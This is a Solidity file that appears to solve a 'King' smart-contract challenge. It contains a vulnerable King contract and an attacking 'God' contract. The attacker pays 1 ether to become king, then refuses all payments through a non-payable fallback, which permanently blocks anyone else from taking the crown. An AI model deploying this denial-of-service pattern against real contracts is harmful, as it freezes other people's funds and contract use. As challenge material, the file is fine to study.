pragma solidity ^0.4.18;

/*
 * Ownable
 *
 * Base contract with an owner.
 * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.
 */
contract Ownable {
  address public owner;

  function Ownable() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    if (msg.sender == owner)
      _;
  }

  function transferOwnership(address newOwner) onlyOwner {
    if (newOwner != address(0)) owner = newOwner;
  }

}

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}

contract God {
    
    address kingAddress = 0x88d7519344929c4592c023d43451f236d6dae562;
    King public kingContract;
    function God() public payable {
        kingContract = King(kingAddress);
    }
    
    function becomeKing() public {
        address(kingContract).call.value(1 ether)();
    }
    
    function() public /*payable*/{
        // TROLLFACE
    }
}